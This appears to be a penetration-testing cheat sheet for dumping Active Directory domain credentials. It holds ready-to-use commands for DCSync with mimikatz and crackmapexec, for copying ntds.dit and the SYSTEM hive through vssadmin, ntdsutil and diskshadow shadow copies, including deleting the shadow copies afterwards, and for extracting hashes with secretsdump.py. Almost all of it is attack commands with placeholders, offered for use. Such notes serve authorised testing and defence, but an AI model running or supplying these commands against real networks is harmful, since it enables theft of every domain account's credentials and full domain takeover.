### DCSync (drsuapi)

```
mimikatz
lsadump::dcsync /domain:<DOMAIN_FQDN> /dc:<DC_FQDN> /user:<krbtgt | USERNAME>

crackmapexec <DC_HOSTNAME | DC_IP> -d "<DOMAIN>" -u '<USERNAME>' -p '<PASSWORD>' --ntds drsuapi
```

### Volume Shadow Copy

###### Local code execution

*vssadmin*

```
vssadmin create shadow /for=C:
# Shadow Copy ID: <GUID>
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\ntds.dit <PATH>\ntds.dit
reg save HKLM\SYSTEM <PATH>\SYSTEM

vssadmin delete shadows /shadow=<GUID>
```

*ntdsutil*

`ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`

```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

*diskshadow*

```
set context persistent nowriters
add volume c: alias alilol
create
expose %alilol% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\Users\backup-svc\ntds.dit
delete shadows volume %alilol%
reset
```

###### Over the network

```
crackmapexec <DC_HOSTNAME | DC_IP> -d "<DOMAIN>" -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
```

### Extract data

```
secretsdump.py -ntds <NTDS_DIT_FILE> -system <SYSTEM_HIVE_FILE> LOCAL
```
